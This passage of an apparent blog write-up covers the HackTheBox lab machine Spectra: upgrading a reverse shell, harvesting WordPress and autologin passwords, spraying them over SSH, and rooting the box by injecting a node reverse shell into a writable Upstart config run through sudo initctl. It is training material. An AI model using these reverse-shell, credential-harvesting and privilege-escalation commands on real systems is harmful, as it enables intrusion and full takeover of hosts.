</span></span></code></pre></div><p>On my listener.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «spectra» «10.10.14.21» 
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>9001</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>9001</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.21<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.229<span class=o>]</span> <span class=m>35166</span>
</span></span><span class=line><span class=cl>Linux spectra 5.4.66+ <span class=c1>#1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7302P 16-Core Processor AuthenticAMD GNU/Linux</span>
</span></span><span class=line><span class=cl> 09:14:42 up 10:53,  <span class=m>0</span> users,  load average: 0.02, 0.04, 0.00
</span></span><span class=line><span class=cl>USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>20155<span class=o>(</span>nginx<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>20156<span class=o>(</span>nginx<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>20156<span class=o>(</span>nginx<span class=o>)</span>
</span></span><span class=line><span class=cl>$ hostname
</span></span><span class=line><span class=cl>spectra
</span></span></code></pre></div><h4 id=shell-upgrade>Shell upgrade<a class=anchor aria-hidden=true href=#shell-upgrade>#</a></h4><p>My current shell doesn&rsquo;t have PATH variable set, so I have to use the full path to upgrade my shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ which python3
</span></span><span class=line><span class=cl>which: no python3 in <span class=o>((</span>null<span class=o>))</span>
</span></span><span class=line><span class=cl>$ ls /usr/bin/ <span class=p>|</span> grep python 
</span></span><span class=line><span class=cl>python
</span></span><span class=line><span class=cl>python-config
</span></span><span class=line><span class=cl>python-wrapper
</span></span><span class=line><span class=cl>python2
</span></span><span class=line><span class=cl>python2.7
</span></span><span class=line><span class=cl>python3
</span></span><span class=line><span class=cl>python3.6
</span></span><span class=line><span class=cl>python3.6m
</span></span><span class=line><span class=cl>$ /usr/bin/python3 -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>nginx@spectra / $ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl>nginx@spectra / $ ^Z
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>  + <span class=m>7285</span> suspended  nc -nvlp <span class=m>9001</span>
</span></span><span class=line><span class=cl>→ root@kali «spectra» «10.10.14.21» 
</span></span><span class=line><span class=cl>$ stty raw -echo<span class=p>;</span> <span class=nb>fg</span>
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>  + <span class=m>7285</span> continued  nc -nvlp <span class=m>9001</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nginx@spectra / $ 
</span></span></code></pre></div><p>To resolve the <code>((null))</code> message, I&rsquo;ll add <code>/usr/bin</code> to current PATH variable.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>nginx@spectra / $ env
</span></span><span class=line><span class=cl><span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl><span class=nv>USER</span><span class=o>=</span>nginx
</span></span><span class=line><span class=cl><span class=nv>PWD</span><span class=o>=</span>/
</span></span><span class=line><span class=cl><span class=nv>SHLVL</span><span class=o>=</span><span class=m>1</span>
</span></span><span class=line><span class=cl><span class=nv>HOME</span><span class=o>=</span>/home/nginx
</span></span><span class=line><span class=cl><span class=nv>_</span><span class=o>=</span>/usr/bin/env
</span></span><span class=line><span class=cl>nginx@spectra / $ <span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span><span class=nv>$PATH</span>:/usr/bin 
</span></span><span class=line><span class=cl>nginx@spectra / $ which python
</span></span><span class=line><span class=cl>/usr/local/bin/python
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-katie>Shell as katie<a class=anchor aria-hidden=true href=#shell-as-katie>#</a></h3><h4 id=internal-enumeration>Internal Enumeration<a class=anchor aria-hidden=true href=#internal-enumeration>#</a></h4><p>There are 4 users with login shell in this machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>nginx@spectra / $ cat /etc/passwd <span class=p>|</span> grep sh$  
</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
</span></span><span class=line><span class=cl>nginx:x:20155:20156::/home/nginx:/bin/bash
</span></span><span class=line><span class=cl>katie:x:20156:20157::/home/katie:/bin/bash
</span></span></code></pre></div><p>Enumerating home directory shows the user flag is on <code>katie</code>&rsquo;s home directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>nginx@spectra / $ ls -lR /home 2&gt;/dev/null
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>/home/katie:
</span></span><span class=line><span class=cl>total <span class=m>8</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> katie katie <span class=m>4096</span> Jan <span class=m>15</span> 15:55 log
</span></span><span class=line><span class=cl>-r-------- <span class=m>1</span> katie katie   <span class=m>33</span> Feb  <span class=m>2</span> 15:57 user.txt
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><p>All the web files are located in <code>/usr/local/share/nginx/html/</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>nginx@spectra / $ find / -type f -name wp-config.php 2&gt;/dev/null
</span></span><span class=line><span class=cl>/usr/local/share/nginx/html/main/wp-config.php
</span></span><span class=line><span class=cl>/usr/local/share/nginx/html/testing/wp-config.php
</span></span><span class=line><span class=cl>/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-config.php
</span></span><span class=line><span class=cl>/mnt/stateful_partition/dev_image/share/nginx/html/testing/wp-config.php
</span></span></code></pre></div><p>The <code>wp-config.php</code> file for <code>/main</code> has different credentials with the one on <code>/testing</code>. I&rsquo;ll grab these credentials.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>nginx@spectra / $ cat /usr/local/share/nginx/html/main/wp-config.php
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>// ** MySQL settings - You can get this info from your web host ** //
</span></span><span class=line><span class=cl>/** The name of the database <span class=k>for</span> WordPress */
</span></span><span class=line><span class=cl>define<span class=o>(</span> <span class=s1>&#39;DB_NAME&#39;</span>, <span class=s1>&#39;dev&#39;</span> <span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/** MySQL database username */
</span></span><span class=line><span class=cl>define<span class=o>(</span> <span class=s1>&#39;DB_USER&#39;</span>, <span class=s1>&#39;dev&#39;</span> <span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/** MySQL database password */
</span></span><span class=line><span class=cl>define<span class=o>(</span> <span class=s1>&#39;DB_PASSWORD&#39;</span>, <span class=s1>&#39;development01&#39;</span> <span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><p>In <code>/opt</code>, there is a file with uncommon extension called <code>autologin.conf.orig</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>nginx@spectra /opt $ cat autologin.conf.orig 
</span></span><span class=line><span class=cl><span class=c1># Copyright 2016 The Chromium OS Authors. All rights reserved.</span>
</span></span><span class=line><span class=cl><span class=c1># Use of this source code is governed by a BSD-style license that can be</span>
</span></span><span class=line><span class=cl><span class=c1># found in the LICENSE file.</span>
</span></span><span class=line><span class=cl>description   <span class=s2>&#34;Automatic login at boot&#34;</span>
</span></span><span class=line><span class=cl>author        <span class=s2>&#34;chromium-os-dev@chromium.org&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># After boot-complete starts, the login prompt is visible and is accepting</span>
</span></span><span class=line><span class=cl><span class=c1># input.</span>
</span></span><span class=line><span class=cl>start on started boot-complete
</span></span><span class=line><span class=cl>script
</span></span><span class=line><span class=cl>  <span class=nv>passwd</span><span class=o>=</span>
</span></span><span class=line><span class=cl>  <span class=c1># Read password from file. The file may optionally end with a newline.</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> dir in /mnt/stateful_partition/etc/autologin /etc/autologin<span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> -e <span class=s2>&#34;</span><span class=si>${</span><span class=nv>dir</span><span class=si>}</span><span class=s2>/passwd&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>      <span class=nv>passwd</span><span class=o>=</span><span class=s2>&#34;</span><span class=k>$(</span>cat <span class=s2>&#34;</span><span class=si>${</span><span class=nv>dir</span><span class=si>}</span><span class=s2>/passwd&#34;</span><span class=k>)</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>      <span class=nb>break</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl>  <span class=k>done</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=o>[</span> -z <span class=s2>&#34;</span><span class=si>${</span><span class=nv>passwd</span><span class=si>}</span><span class=s2>&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>  <span class=k>fi</span>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><p>Based on the comments, the file is an autologin script. It looks for <code>passwd</code> file in these directories:</p><ul><li><code>/mnt/stateful_partition/etc/autologin</code></li><li><code>/etc/autologin</code></li></ul><p>And the <code>passwd</code> file in <code>/etc/autologin/</code> directory contains a password.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>nginx@spectra /opt $ ls -l /etc/autologin/             
</span></span><span class=line><span class=cl>total <span class=m>4</span>
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root <span class=m>19</span> Feb  <span class=m>3</span> 16:43 passwd
</span></span><span class=line><span class=cl>nginx@spectra /opt $ cat /etc/autologin/passwd 
</span></span><span class=line><span class=cl>SummerHereWeCome!!
</span></span></code></pre></div><h4 id=ssh---katie>SSH - katie<a class=anchor aria-hidden=true href=#ssh---katie>#</a></h4><p>I&rsquo;ll spray <code>SummerHereWeCome!!</code> and <code>development01</code> using <code>crackmapexec</code> to the users who have login shell. Within a few sec, it returns that <code>katie:SummerHereWeCome!!</code> are the valid credentials.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «spectra» «10.10.14.21» 
</span></span><span class=line><span class=cl>$ crackmapexec ssh 10.10.10.229 -u users.list -p passwords.list
</span></span><span class=line><span class=cl>SSH         10.10.10.229    <span class=m>22</span>     10.10.10.229     <span class=o>[</span>*<span class=o>]</span> SSH-2.0-OpenSSH_8.1
</span></span><span class=line><span class=cl>SSH         10.10.10.229    <span class=m>22</span>     10.10.10.229     <span class=o>[</span>-<span class=o>]</span> chronos:devteam01 Bad authentication type<span class=p>;</span> allowed types: <span class=o>[</span><span class=s1>&#39;publickey&#39;</span>, <span class=s1>&#39;keyboard-interactive&#39;</span><span class=o>]</span>
</span></span><span class=line><span class=cl>SSH         10.10.10.229    <span class=m>22</span>     10.10.10.229     <span class=o>[</span>-<span class=o>]</span> chronos:development01 Bad authentication type<span class=p>;</span> allowed types: <span class=o>[</span><span class=s1>&#39;publickey&#39;</span>, <span class=s1>&#39;keyboard-interactive&#39;</span><span class=o>]</span>
</span></span><span class=line><span class=cl>SSH         10.10.10.229    <span class=m>22</span>     10.10.10.229     <span class=o>[</span>-<span class=o>]</span> chronos:SummerHereWeCome!! Bad authentication type<span class=p>;</span> allowed types: <span class=o>[</span><span class=s1>&#39;publickey&#39;</span>, <span class=s1>&#39;keyboard-interactive&#39;</span><span class=o>]</span>
</span></span><span class=line><span class=cl>SSH         10.10.10.229    <span class=m>22</span>     10.10.10.229     <span class=o>[</span>-<span class=o>]</span> katie:devteam01 Bad authentication type<span class=p>;</span> allowed types: <span class=o>[</span><span class=s1>&#39;publickey&#39;</span>, <span class=s1>&#39;keyboard-interactive&#39;</span><span class=o>]</span>
</span></span><span class=line><span class=cl>SSH         10.10.10.229    <span class=m>22</span>     10.10.10.229     <span class=o>[</span>-<span class=o>]</span> katie:development01 Bad authentication type<span class=p>;</span> allowed types: <span class=o>[</span><span class=s1>&#39;publickey&#39;</span>, <span class=s1>&#39;keyboard-interactive&#39;</span><span class=o>]</span>
</span></span><span class=line><span class=cl>SSH         10.10.10.229    <span class=m>22</span>     10.10.10.229     <span class=o>[</span>+<span class=o>]</span> katie:SummerHereWeCome!!
</span></span></code></pre></div><p>I&rsquo;m able to login via SSH</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «spectra» «10.10.14.21» 
</span></span><span class=line><span class=cl>$ ssh katie@10.10.10.229
</span></span><span class=line><span class=cl>Password: 
</span></span><span class=line><span class=cl>katie@spectra ~ $ id 
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>20156<span class=o>(</span>katie<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>20157<span class=o>(</span>katie<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>20157<span class=o>(</span>katie<span class=o>)</span>,20158<span class=o>(</span>developers<span class=o>)</span>
</span></span></code></pre></div><p>User flag is done here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>katie@spectra ~ $ ls -la
</span></span><span class=line><span class=cl>total <span class=m>36</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>5</span> katie katie <span class=m>4096</span> May <span class=m>15</span> 12:17 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>8</span> root  root  <span class=m>4096</span> Feb  <span class=m>2</span> 15:55 ..
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root  root     <span class=m>9</span> Feb  <span class=m>2</span> 15:55 .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> katie katie  <span class=m>127</span> Dec <span class=m>22</span> 05:46 .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> katie katie  <span class=m>204</span> Dec <span class=m>22</span> 05:46 .bash_profile
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> katie katie  <span class=m>551</span> Dec <span class=m>22</span> 05:46 .bashrc
</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> katie katie <span class=m>4096</span> May <span class=m>15</span> 12:17 .gnupg
</span></span><span class=line><span class=cl>drwx------ <span class=m>3</span> katie katie <span class=m>4096</span> Jan <span class=m>15</span> 15:55 .pki
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> katie katie <span class=m>4096</span> Jan <span class=m>15</span> 15:55 log
</span></span><span class=line><span class=cl>-r-------- <span class=m>1</span> katie katie   <span class=m>33</span> Feb  <span class=m>2</span> 15:57 user.txt
</span></span></code></pre></div><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=internal-enumeration-1>Internal Enumeration<a class=anchor aria-hidden=true href=#internal-enumeration-1>#</a></h4><p>The first thing I will check if I have the user&rsquo;s password is the sudo rights, and this user has one on <a href=https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it><code>initctl</code></a>. Unfortunately, <code>initctl</code> is not listed on GTFObins site, so I&rsquo;ll have to look around.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>katie@spectra ~ $ sudo -l
</span></span><span class=line><span class=cl>User katie may run the following commands on spectra:
</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL<span class=o>)</span> SETENV: NOPASSWD: /sbin/initctl
</span></span></code></pre></div><p>Enumerating for files owned by developers discovers some writable <code>.conf</code> files and a JavaScript file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>katie@spectra ~ $ find / -type f -group developers -ls 2&gt;/dev/null
</span></span><span class=line><span class=cl>    <span class=m>32121</span>      <span class=m>4</span> -rw-rw----   <span class=m>1</span> root     developers      <span class=m>478</span> Jun <span class=m>29</span>  <span class=m>2020</span> /etc/init/test6.conf
</span></span><span class=line><span class=cl>    <span class=m>32123</span>      <span class=m>4</span> -rw-rw----   <span class=m>1</span> root     developers      <span class=m>478</span> Jun <span class=m>29</span>  <span class=m>2020</span> /etc/init/test7.conf
</span></span><span class=line><span class=cl>    <span class=m>32109</span>      <span class=m>4</span> -rw-rw----   <span class=m>1</span> root     developers      <span class=m>478</span> Jun <span class=m>29</span>  <span class=m>2020</span> /etc/init/test3.conf
</span></span><span class=line><span class=cl>    <span class=m>32112</span>      <span class=m>4</span> -rw-rw----   <span class=m>1</span> root     developers      <span class=m>478</span> Jun <span class=m>29</span>  <span class=m>2020</span> /etc/init/test4.conf
</span></span><span class=line><span class=cl>    <span class=m>32103</span>      <span class=m>4</span> -rw-rw----   <span class=m>1</span> root     developers      <span class=m>478</span> Jun <span class=m>29</span>  <span class=m>2020</span> /etc/init/test.conf
</span></span><span class=line><span class=cl>    <span class=m>32126</span>      <span class=m>4</span> -rw-rw----   <span class=m>1</span> root     developers      <span class=m>478</span> Jun <span class=m>29</span>  <span class=m>2020</span> /etc/init/test8.conf
</span></span><span class=line><span class=cl>    <span class=m>32128</span>      <span class=m>4</span> -rw-rw----   <span class=m>1</span> root     developers      <span class=m>478</span> Jun <span class=m>29</span>  <span class=m>2020</span> /etc/init/test9.conf
</span></span><span class=line><span class=cl>    <span class=m>32106</span>      <span class=m>4</span> -rw-rw----   <span class=m>1</span> root     developers      <span class=m>478</span> Jun <span class=m>29</span>  <span class=m>2020</span> /etc/init/test10.conf
</span></span><span class=line><span class=cl>    <span class=m>32108</span>      <span class=m>4</span> -rw-rw----   <span class=m>1</span> root     developers      <span class=m>478</span> Jun <span class=m>29</span>  <span class=m>2020</span> /etc/init/test2.conf
</span></span><span class=line><span class=cl>    <span class=m>32120</span>      <span class=m>4</span> -rw-rw----   <span class=m>1</span> root     developers      <span class=m>478</span> Jun <span class=m>29</span>  <span class=m>2020</span> /etc/init/test5.conf
</span></span><span class=line><span class=cl>    <span class=m>32105</span>      <span class=m>4</span> -rw-rw----   <span class=m>1</span> root     developers      <span class=m>478</span> Jun <span class=m>29</span>  <span class=m>2020</span> /etc/init/test1.conf
</span></span><span class=line><span class=cl>    <span class=m>23763</span>      <span class=m>4</span> -rwxrwxr-x   <span class=m>1</span> root     developers      <span class=m>251</span> Jun <span class=m>29</span>  <span class=m>2020</span> /srv/nodetest.js
</span></span></code></pre></div><p>These <code>.conf</code> files are configuration scripts to start <code>/srv/nodetest.js</code>. The JS file itself is not that important here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>katie@spectra ~ $ cat /etc/init/test.conf 
</span></span><span class=line><span class=cl>description <span class=s2>&#34;Test node.js server&#34;</span>
</span></span><span class=line><span class=cl>author      <span class=s2>&#34;katie&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>start on filesystem or runlevel <span class=o>[</span>2345<span class=o>]</span>
</span></span><span class=line><span class=cl>stop on shutdown
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>script
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>export</span> <span class=nv>HOME</span><span class=o>=</span><span class=s2>&#34;/srv&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=nv>$$</span> &gt; /var/run/nodetest.pid
</span></span><span class=line><span class=cl>    <span class=nb>exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>end script
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pre-start script
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;[`date`] Node Test Starting&#34;</span> &gt;&gt; /var/log/nodetest.log
</span></span><span class=line><span class=cl>end script
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pre-stop script
</span></span><span class=line><span class=cl>    rm /var/run/nodetest.pid
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;[`date`] Node Test Stopping&#34;</span> &gt;&gt; /var/log/nodetest.log
</span></span><span class=line><span class=cl>end script
</span></span></code></pre></div><h4 id=abusing-sudo-initctl>Abusing sudo initctl<a class=anchor aria-hidden=true href=#abusing-sudo-initctl>#</a></h4><p>With sudo privileges and write access on the configuration files, I can perform a command injection to send myself a root shell.</p><p>In this write-up, I&rsquo;d like to try injecting a <a href=https://gtfobins.github.io/gtfobins/node/#sudo>node</a> reverse shell.</p><p>First, I&rsquo;ll create a copy of the configuration file, which contains reverse shell to my machine and it is without the pre and post script part. I&rsquo;ll name it <code>exploit.conf</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «exploits» «10.10.14.21»
</span></span><span class=line><span class=cl>$ cat exploit.conf
</span></span><span class=line><span class=cl>description <span class=s2>&#34;Test node.js server&#34;</span>
</span></span><span class=line><span class=cl>author      <span class=s2>&#34;katie&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>start on filesystem or runlevel <span class=o>[</span>2345<span class=o>]</span>
</span></span><span class=line><span class=cl>stop on shutdown
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>script
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>export</span> <span class=nv>HOME</span><span class=o>=</span><span class=s2>&#34;/srv&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=nv>$$</span> &gt; /var/run/nodetest.pid
</span></span><span class=line><span class=cl>    <span class=nb>export</span> <span class=nv>RHOST</span><span class=o>=</span>10.10.14.21
</span></span><span class=line><span class=cl>    <span class=nb>export</span> <span class=nv>RPORT</span><span class=o>=</span><span class=m>9001</span>
</span></span><span class=line><span class=cl>    <span class=nb>exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node -e <span class=s1>&#39;sh = child_process.spawn(&#34;/bin/sh&#34;); net.connect(process.env.RPORT, process.env.RHOST, function () {
</span></span></span><span class=line><span class=cl><span class=s1>    this.pipe(sh.stdin);
</span></span></span><span class=line><span class=cl><span class=s1>    sh.stdout.pipe(this);
</span></span></span><span class=line><span class=cl><span class=s1>    sh.stderr.pipe(this);
</span></span></span><span class=line><span class=cl><span class=s1>    })&#39;</span>
</span></span><span class=line><span class=cl>    <span class=nb>exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>end script
</span></span></code></pre></div><p>After that, I&rsquo;ll transfer the file to Spectra in <code>/dev/shm</code> directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «exploits» «10.10.14.21»
</span></span><span class=line><span class=cl>$ scp exploit.conf katie@10.10.10.229:/dev/shm
</span></span><span class=line><span class=cl>Password:
</span></span><span class=line><span class=cl>bash: warning: /home/katie/.bashrc: warning: script from noexec mount<span class=p>;</span> see https://chromium.googlesource.com/chromiumos/docs/+/master/security/noexec_shell_scripts.md
</span></span><span class=line><span class=cl>exploit.conf                               100%  <span class=m>775</span>    13.1KB/s   00:00
</span></span></code></pre></div><p>I&rsquo;ll setup a <code>nc</code> listener on my Kali and execute the following command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>katie@spectra /etc/init $ sudo /sbin/initctl stop test5 2&gt;/dev/null<span class=p>;</span> cat /dev/shm/exploit.conf &gt; test5.conf <span class=o>&amp;&amp;</span> sudo /sbin/initctl start test5
</span></span><span class=line><span class=cl>test5 start/running, process <span class=m>33889</span>
</span></span></code></pre></div><p>If I check my listener, I have a root shell now.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «spectra» «10.10.14.21»
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>9001</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>9001</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.21<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.229<span class=o>]</span> <span class=m>37220</span>
</span></span><span class=line><span class=cl>id <span class=o>&amp;&amp;</span> hostname <span class=o>&amp;&amp;</span> ip a
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
</span></span><span class=line><span class=cl>spectra
</span></span><span class=line><span class=cl>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class=m>65536</span> qdisc noqueue state UNKNOWN group default qlen <span class=m>1000</span>
</span></span><span class=line><span class=cl>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span class=line><span class=cl>    inet 127.0.0.1/8 scope host lo
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span><span class=line><span class=cl>    inet6 ::1/128 scope host
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span><span class=line><span class=cl>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class=m>1500</span> qdisc pfifo_fast state UP group default qlen <span class=m>1000</span>
</span></span><span class=line><span class=cl>    link/ether 00:50:56:b9:0b:2c brd ff:ff:ff:ff:ff:ff
</span></span><span class=line><span class=cl>    inet 10.10.10.229/24 brd 10.10.10.255 scope global eth0
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span><span class=line><span class=cl>    inet6 dead:beef::15c7:10de:7382:baf8/64 scope global temporary dynamic
</span></span><span class=line><span class=cl>       valid_lft 86303sec preferred_lft 14303sec
</span></span><span class=line><span class=cl>    inet6 dead:beef::250:56ff:feb9:b2c/64 scope global dynamic mngtmpaddr
</span></span><span class=line><span class=cl>       valid_lft 86303sec preferred_lft 14303sec
</span></span><span class=line><span class=cl>    inet6 fe80::250:56ff:feb9:b2c/64 scope link
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210715085053464.png alt=image-20210715085053464></div></p><div class=post-references><h2>References</h2><ul><li><a href=https://www.hackingarticles.in/wordpress-reverse-shell/ target=_blank rel="noopener noreferrer">https://www.hackingarticles.in/wordpress-reverse-shell/</a></li><li><a href=https://github.com/pentestmonkey/php-reverse-shell target=_blank rel="noopener noreferrer">https://github.com/pentestmonkey/php-reverse-shell</a></li><li><a href=https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it target=_blank rel="noopener noreferrer">https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/chrome-os/>Chrome-OS</a></li><li><a href=https://fahmifj.github.io/tags/wordpress/>WordPress</a></li><li><a href=https://fahmifj.github.io/tags/directory-listing/>Directory-listing</a></li><li><a href=https://fahmifj.github.io/tags/webshell/>Webshell</a></li><li><a href=https://fahmifj.github.io/tags/password-reuse/>Password-reuse</a></li><li><a href=https://fahmifj.github.io/tags/command-injection/>Command-injection</a></li><li><a href=https://fahmifj.github.io/tags/sudo/>sudo</a></li><li><a href=https://fahmifj.github.io/tags/initctl/>initctl</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Spectra on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Spectra&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fspectra%2f&hashtags=Linux%2cChrome-OS%2cWordPress%2cDirectory-listing%2cWebshell%2cPassword-reuse%2cCommand-injection%2csudo%2cinitctl"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 